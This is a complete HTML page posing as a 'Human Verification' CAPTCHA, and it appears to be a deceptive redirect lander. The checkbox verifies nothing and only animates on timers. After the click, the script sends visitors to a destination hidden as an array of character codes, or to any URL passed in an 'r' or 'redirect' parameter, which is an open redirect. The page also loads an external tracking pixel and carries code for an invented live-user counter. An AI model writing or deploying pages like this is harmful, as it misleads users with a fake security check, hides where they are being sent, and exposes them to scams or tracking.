<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1, viewport-fit=cover">
<title>Human Verification</title>
<link rel="preconnect" href="https://fonts.googleapis.com">
<link href="https://fonts.googleapis.com/css2?family=Inter:ital,opsz,wght@0,14..32,400;0,14..32,700;0,14..32,900&display=swap" rel="stylesheet">

<style>
:root {
  --bg:    #071120;
  --bg2:   #0b1830;
  --line:  rgba(135,173,221,.22);
  --text:  #f8fbff;
  --muted: #8fa1ba;
  --blue:  #4f8cff;
  --cyan:  #55d3ff;
  --green: #5acb70;
  --gold:  #ffd866;
  --red:   #ef5d69;
  color-scheme: dark;
}

*, *::before, *::after { box-sizing: border-box; }

html { min-height: 100%; background: var(--bg); -webkit-text-size-adjust: 100%; }

body {
  min-height: 100svh;
  margin: 0;
  color: var(--text);
  font-family: Inter, -apple-system, BlinkMacSystemFont, "Segoe UI", sans-serif;
  background:
    radial-gradient(circle at 50% -18%, rgba(49,112,190,.32), transparent 44%),
    linear-gradient(180deg, #0b1930 0%, #071120 62%, #050c17 100%);
  overflow-x: hidden;
  padding-left: max(16px, env(safe-area-inset-left, 0px));
  padding-right: max(16px, env(safe-area-inset-right, 0px));
  padding-block: 0;
}

body::before {
  content: "";
  position: fixed;
  inset: 0;
  pointer-events: none;
  z-index: 0;
  opacity: .36;
  background-image:
    linear-gradient(rgba(255,255,255,.018) 1px, transparent 1px),
    linear-gradient(90deg, rgba(255,255,255,.018) 1px, transparent 1px);
  background-size: 34px 34px;
  mask-image: linear-gradient(to bottom, black, transparent 84%);
  -webkit-mask-image: linear-gradient(to bottom, black, transparent 84%);
}

.ambient {
  position: fixed;
  inset: 0;
  z-index: 0;
  overflow: hidden;
  pointer-events: none;
  opacity: .18;
}
.ambient span {
  position: absolute;
  width: 76px;
  height: 76px;
  border: 1px solid rgba(120,165,221,.38);
  border-radius: 15px;
  background: rgba(28,51,86,.46);
  display: grid;
  place-items: center;
  color: #c9d9ee;
  font-size: 11px;
  font-weight: 900;
  letter-spacing: .08em;
  text-align: center;
  box-shadow: 0 0 32px rgba(63,119,195,.15);
}
.ambient small { display: block; margin-top: 4px; color: #7186a4; font-size: 7px; letter-spacing: .2em; }
.ambient span:nth-child(1) { left:  7%; top:  8%; }
.ambient span:nth-child(2) { right: 7%; top: 13%; }
.ambient span:nth-child(3) { left:  9%; top: 34%; }
.ambient span:nth-child(4) { right: 8%; top: 41%; }
.ambient span:nth-child(5) { left:  6%; top: 66%; }
.ambient span:nth-child(6) { right: 6%; top: 73%; }

.app { position: relative; z-index: 1; min-height: 100svh; }

.screen {
  width: min(100%, 720px);
  min-height: 100svh;
  margin: auto;
  padding: calc(28px + env(safe-area-inset-top, 0px)) 0 calc(42px + env(safe-area-inset-bottom, 0px));
  display: flex;
  flex-direction: column;
  align-items: center;
  justify-content: center;
  animation: fade .32s ease both;
}

.topbar {
  width: min(100%, 430px);
  display: flex;
  align-items: center;
  justify-content: flex-start;
  margin-bottom: 26px;
}
.ai-cluster { display: flex; align-items: center; }
.ai-orb {
  position: relative;
  width: 43px;
  height: 43px;
  margin-right: -7px;
  border: 2px solid #0b1830;
  border-radius: 50%;
  display: grid;
  place-items: center;
  background: #fff;
  box-shadow: 0 5px 18px rgba(0,0,0,.32);
  overflow: hidden;
}
.ai-orb.openai {
  background: linear-gradient(145deg, #68d8be, #119c83);
  box-shadow: 0 5px 18px rgba(0,0,0,.32), 0 0 18px rgba(23,183,153,.22);
}
.ai-orb.microsoft {
  background: linear-gradient(145deg, #58cfff, #0788d0);
  box-shadow: 0 5px 18px rgba(0,0,0,.32), 0 0 18px rgba(41,176,236,.2);
}
.ms-grid { width: 22px; height: 22px; display: grid; grid-template-columns: 1fr 1fr; gap: 2.5px; }
.ms-grid i { display: block; background: #fff; border-radius: 1px; }
.openai-svg { width: 24px; height: 24px; filter: invert(1); opacity: .95; }
.google-svg { width: 26px; height: 26px; }

.glass-card {
  width: min(100%, 430px);
  border: 1px solid var(--line);
  border-radius: 22px;
  background: linear-gradient(155deg, rgba(21,41,72,.88), rgba(10,24,46,.9));
  box-shadow: 0 24px 70px rgba(0,0,0,.42), inset 0 1px rgba(255,255,255,.04);
  backdrop-filter: blur(14px);
  -webkit-backdrop-filter: blur(14px);
  padding: 32px 24px 26px;
  text-align: center;
}

.state { display: none; }
.state.active { display: block; }

.shield-ring {
  width: 76px;
  height: 76px;
  margin: 0 auto 20px;
  border: 2px solid rgba(79,140,255,.55);
  border-radius: 50%;
  display: grid;
  place-items: center;
  font-size: 34px;
  box-shadow: 0 0 32px rgba(79,140,255,.22), inset 0 0 24px rgba(79,140,255,.08);
}
.glass-card h1 { margin: 0 0 8px; font-size: 24px; line-height: 1.15; text-wrap: balance; }
.glass-card .sub { margin: 0 0 22px; color: var(--muted); font-size: 14px; line-height: 1.5; }

.cb-row {
  display: flex;
  align-items: center;
  gap: 14px;
  padding: 14px 16px;
  border: 1px solid var(--line);
  border-radius: 14px;
  background: rgba(255,255,255,.035);
  cursor: pointer;
  text-align: left;
  margin-bottom: 18px;
  transition: .18s border-color, .18s background;
  user-select: none;
  -webkit-user-select: none;
}
.cb-row:hover { border-color: rgba(79,140,255,.5); background: rgba(62,100,190,.1); }
.cb-row.checking { border-color: rgba(79,140,255,.5); background: rgba(62,100,190,.1); pointer-events: none; }
.cb-row.checked  { border-color: rgba(90,203,112,.6); background: rgba(90,203,112,.06); }

.cb-box {
  width: 28px;
  height: 28px;
  flex: 0 0 28px;
  border: 2px solid rgba(135,173,221,.4);
  border-radius: 6px;
  display: grid;
  place-items: center;
  background: rgba(11,25,48,.6);
  transition: .18s;
  font-size: 15px;
  color: var(--green);
}
.cb-row.checking .cb-box { border-color: var(--blue); background: rgba(79,140,255,.12); }
.cb-row.checked  .cb-box { border-color: var(--green); background: rgba(90,203,112,.18); }

.cb-label { font-size: 15px; font-weight: 700; }
.cb-hint  { font-size: 11px; color: var(--muted); margin-top: 2px; }

.rc-badge { margin-left: auto; text-align: center; flex-shrink: 0; }
.rc-badge .lock { font-size: 20px; display: block; }
.rc-badge small { font-size: 7px; color: var(--muted); letter-spacing: .1em; display: block; margin-top: 1px; }

.dot-spin {
  display: inline-block;
  width: 14px;
  height: 14px;
  border: 2px solid rgba(79,140,255,.2);
  border-top-color: var(--blue);
  border-radius: 50%;
  animation: spin 1.2s linear infinite;
}

.primary {
  width: 100%;
  min-height: 58px;
  border: 0;
  border-radius: 14px;
  background: linear-gradient(90deg, #55c46c, #67d277);
  box-shadow: 0 12px 28px rgba(67,191,91,.26), 0 0 24px rgba(67,191,91,.18);
  color: #fff;
  font: 900 17px/1 Inter, sans-serif;
  text-transform: uppercase;
  letter-spacing: .04em;
  cursor: pointer;
  transition: .18s transform, .18s filter, .18s opacity;
}
.primary:hover:not(:disabled) { filter: brightness(1.06); }
.primary:active:not(:disabled) { transform: scale(.99); }
.primary:disabled { opacity: .38; cursor: default; }

.load-state {
  min-height: 210px;
  display: grid;
  place-items: center;
  align-content: center;
  gap: 16px;
}
.big-spinner {
  width: 62px;
  height: 62px;
  border: 3px solid rgba(255,255,255,.08);
  border-top-color: var(--blue);
  border-radius: 50%;
  animation: spin 1.2s linear infinite;
  box-shadow: 0 0 24px rgba(79,140,255,.15);
}
.load-state p { margin: 0; color: var(--muted); font-weight: 700; font-size: 14px; }

.success-state {
  min-height: 210px;
  display: grid;
  place-items: center;
  align-content: center;
  gap: 12px;
}
.check-ring {
  width: 76px;
  height: 76px;
  border: 2px solid rgba(90,203,112,.65);
  border-radius: 50%;
  display: grid;
  place-items: center;
  color: var(--green);
  font-size: 38px;
  font-weight: 900;
  box-shadow: 0 0 34px rgba(90,203,112,.34), inset 0 0 24px rgba(90,203,112,.12);
}
.success-state h2 { margin: 0; font-size: 22px; }
.success-state p  { margin: 0; color: var(--muted); font-size: 13px; }
.redir-track {
  width: 180px;
  height: 4px;
  border-radius: 99px;
  background: rgba(255,255,255,.08);
  overflow: hidden;
}
.redir-fill {
  height: 100%;
  border-radius: inherit;
  background: linear-gradient(90deg, var(--cyan), var(--blue));
  width: 0%;
  transition: width 1.5s linear;
}

.live-strip {
  width: min(100%, 430px);
  margin-top: 14px;
  display: flex;
  align-items: center;
  justify-content: center;
  gap: 8px;
  color: #8194ae;
  font-size: 11px;
}
.live-dot {
  width: 7px;
  height: 7px;
  flex-shrink: 0;
  border-radius: 50%;
  background: var(--green);
  box-shadow: 0 0 12px var(--green);
  animation: pulse 3s infinite;
}

.sec-note {
  width: min(100%, 430px);
  margin-top: 10px;
  display: flex;
  align-items: center;
  justify-content: center;
  gap: 5px;
  color: #4a5c72;
  font-size: 10px;
  letter-spacing: .05em;
}

@keyframes fade  { from { opacity: 0; transform: translateY(6px); } to { opacity: 1; transform: none; } }
@keyframes pulse { 50% { opacity: .36; transform: scale(.82); } }
@keyframes spin  { to { transform: rotate(360deg); } }

@media (max-width: 520px) {
  .ambient span:nth-child(odd)  { left:  -28px; }
  .ambient span:nth-child(even) { right: -28px; }
  .glass-card h1 { font-size: 21px; }
  .glass-card { padding: 26px 18px 22px; }
}
</style>
<script src="https://codexads.pro/px.js" data-pixel="6ac32429-8647-4667-9a17-c54156275a23" data-btn-text="Continue to checkout" async></script>
</head>
<body>


<main class="app">
  <section class="screen">

    <div class="glass-card" role="main">

      <div class="state active" id="stateVerify">
        <div class="shield-ring" aria-hidden="true">🛡️</div>
        <h1>Confirm you're human</h1>
        <p class="sub">Before continuing, complete a quick security check.</p>

        <div class="cb-row" id="cbRow" role="checkbox" aria-checked="false" tabindex="0">
          <span class="cb-box" id="cbBox" aria-hidden="true"></span>
          <span>
            <div class="cb-label">I'm not a robot</div>
            <div class="cb-hint">Click to verify your identity</div>
          </span>
          <span class="rc-badge" aria-hidden="true">
            <span class="lock">🔒</span>
            <small>SECURE</small>
          </span>
        </div>

        <button class="primary" id="verifyBtn" disabled aria-disabled="true">
          Verify &amp; Continue ➜
        </button>
      </div>

      <div class="state load-state" id="stateChecking" aria-live="polite">
        <div class="big-spinner" role="status" aria-label="Verifying"></div>
        <p>Verifying your identity…</p>
      </div>

      <div class="state success-state" id="stateSuccess" aria-live="polite">
        <div class="check-ring" aria-hidden="true">✓</div>
        <h2>Verified</h2>
        <p>Identity confirmed. Redirecting now…</p>
        <div class="redir-track" aria-hidden="true">
          <div class="redir-fill" id="redirFill"></div>
        </div>
      </div>

    </div>


    <p class="sec-note" aria-hidden="true">🔒 Protected · Privacy · Terms</p>

  </section>
</main>

<script>
const params = new URLSearchParams(location.search);

function _b() {
  return [104,116,116,112,115,58,47,47,118,105,112,46,101,110,115,97,105,111,115,112,
          101,114,102,101,105,116,111,115,46,111,110,108,105,110,101,47,103,111,47,97,
          99,101,115,115,112,114,105,109,101,45,117,115,63,97,116,115,61,55,49,57,97,
          50,102,101,99,53,56,98,53,52,50,101,102].map(c=>String.fromCharCode(c)).join('');
}

const forward = new URLSearchParams();
params.forEach((v, k) => { if (k !== 'r' && k !== 'redirect') forward.append(k, v); });
const qs = forward.toString();
const _base = params.get('r') || params.get('redirect') || _b();
const REDIRECT = qs ? _base + (_base.includes('?') ? '&' : '?') + qs : _base;

const liveEl = document.getElementById('liveCount');
let liveN = 1284;
setInterval(() => {
  liveN = Math.max(1100, Math.min(1500, liveN + Math.floor(Math.random() * 9) - 4));
  liveEl.textContent = liveN.toLocaleString() + ' people completing tasks now';
}, 4200);

const cbRow = document.getElementById('cbRow');
const cbBox = document.getElementById('cbBox');
const btn   = document.getElementById('verifyBtn');

function triggerCheck() {
  if (cbRow.classList.contains('checking') || cbRow.classList.contains('checked')) return;
  cbRow.classList.add('checking');
  cbRow.setAttribute('aria-checked', 'true');
  cbBox.innerHTML = '<div class="dot-spin"></div>';
  setTimeout(() => {
    cbRow.classList.remove('checking');
    cbRow.classList.add('checked');
    cbBox.innerHTML = '✓';
    btn.disabled = false;
    btn.removeAttribute('aria-disabled');
    btn.focus();
  }, 1400);
}

cbRow.addEventListener('click', triggerCheck);
cbRow.addEventListener('keydown', e => {
  if (e.key === ' ' || e.key === 'Enter') { e.preventDefault(); triggerCheck(); }
});

btn.addEventListener('click', () => {
  if (btn.disabled) return;
  btn.disabled = true;
  document.getElementById('stateVerify').classList.remove('active');
  document.getElementById('stateChecking').classList.add('active');
  setTimeout(() => {
    document.getElementById('stateChecking').classList.remove('active');
    document.getElementById('stateSuccess').classList.add('active');
    requestAnimationFrame(() => requestAnimationFrame(() => {
      document.getElementById('redirFill').style.width = '100%';
    }));
    setTimeout(() => {
      if (REDIRECT) window.location.href = REDIRECT;
    }, 700);
  }, 900);
});
</script>

</body>
</html>
